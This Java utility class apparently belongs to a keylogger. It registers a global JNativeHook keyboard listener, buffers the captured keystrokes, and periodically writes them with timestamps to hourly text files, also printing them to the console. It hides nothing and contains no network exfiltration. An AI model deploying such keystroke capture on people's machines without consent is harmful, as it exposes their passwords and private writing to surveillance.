package org.example.utils;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import org.example.keys.GlobalKeyListener;

import java.io.File;
import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class HookUtils {

    static PropertyUtils propertyUtils = PropertyUtils.getInstance();
    public static boolean exitIssued = false;
    public static StringBuilder currentLog = new StringBuilder();
    public static Timestamp lastWritten;

    public static void registerHook() {
        try {
            System.out.println("Initializing hook registration...");
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
            System.out.println("Done.");
        } catch (NativeHookException ex) {
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }

    public static void unregisterHook() {
        try {
            exitIssued = true;
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException ex) {
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }

    public static void addLogs(String content) {
        currentLog.append(content);
    }

    public static void updateLogFile() {
        if (currentLog.toString().isEmpty()) {
            return;
        }
        if (lastWritten == null) {
            lastWritten = new Timestamp(System.currentTimeMillis());
        }
        boolean overwrite = false;
        Timestamp timestamp = new Timestamp(System.currentTimeMillis());
        //File file = TextFileUtils.getFile(propertyUtils.getStringProperty("filePath") + propertyUtils.getStringProperty("fileName") + timestamp.toInstant());
        int seconds = ((int) (timestamp.getTime() - lastWritten.getTime())) / 1000;
        if (seconds > Integer.parseInt(propertyUtils.getStringProperty("writeEverySeconds"))) {
            String data = "\n" + timestamp + "\n" + currentLog;
            currentLog = new StringBuilder();
            System.out.println("writing: " + data);
            Date date = new Date(timestamp.getTime());
            DateFormat sdf = new SimpleDateFormat("yyyy-MM-dd-HH");
            String fileName = propertyUtils.getStringProperty("filePath")
                    + propertyUtils.getStringProperty("fileName") + sdf.format(date) + ".txt";
            TextFileUtils.updateFile(fileName, data);
        }

    }
}
